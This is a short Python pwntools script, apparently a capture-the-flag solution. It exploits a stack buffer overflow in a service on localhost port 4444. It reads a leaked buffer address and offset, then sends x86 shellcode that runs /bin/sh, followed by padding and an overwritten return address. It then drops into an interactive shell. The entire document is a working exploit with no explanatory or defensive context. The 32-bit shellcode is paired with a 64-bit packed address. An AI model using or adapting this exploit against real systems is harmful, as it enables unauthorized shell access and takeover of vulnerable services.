from pwn import *

s = remote("127.0.0.1", 4444)

# get address of buffer
s.recvuntil("buf: ")
addr = int(s.recvline().strip(), 16)
log.info("Buffer at: %s" % hex(addr))

# get offset
s.recvuntil("ret offset: ")
off = int(s.recvline().strip())
log.info("Offset: %s" % hex(off))

# send payload
sploit = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
size = off - len(sploit)
log.info("Writing %d bytes of padding" % size)
sploit += "A" * size
sploit += p64(addr)

s.recvuntil("Input:")
s.send(sploit)

s.interactive()
